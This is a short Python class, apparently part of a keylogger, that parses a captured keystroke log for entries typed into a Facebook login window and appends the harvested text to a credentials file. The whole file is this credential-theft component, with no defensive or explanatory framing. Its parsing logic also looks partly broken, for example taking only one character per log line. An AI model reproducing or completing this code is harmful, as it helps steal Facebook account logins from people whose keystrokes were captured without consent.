class Analyzer:
    def __init__(self, log_file, cred_file):
        # arguments
        self.log_file = log_file
        self.cred_file = open(cred_file, 'a')
        
        # other properties
        self.will_not_parse = False
        self.got_fb_creds = False
        self.fb_creds = ''
    
    def parse_log_file(self):
        log_fd = open(self.log_file, 'r')
        self.will_not_parse = self.got_fb_creds # AND *_cred vars
        if self.will_not_parse:
            self.cred_file.close()
            return self.will_not_parse
        else:
            #log_fd = open(self.log_file, 'r')
            if(not self.got_fb_creds):
                for msg in log_fd:
                    if(('Facebook' in msg) and ('Log In' in msg)):
                        if('Key'not in msg):
                            self.fb_creds += msg[1]
                    elif(('Facebook' in msg) and ('Log In' not in msg)):
                        # add to cred file
                        self.cred_file.write('Facebook: %s\n' % self.fb_creds)
                        self.got_fb_creds= True
                    else:
                        continue
        self.will_not_parse = self.got_fb_creds # AND *_cred vars
        log_fd.close()
        self.cred_file.close()
        return self.will_not_parse
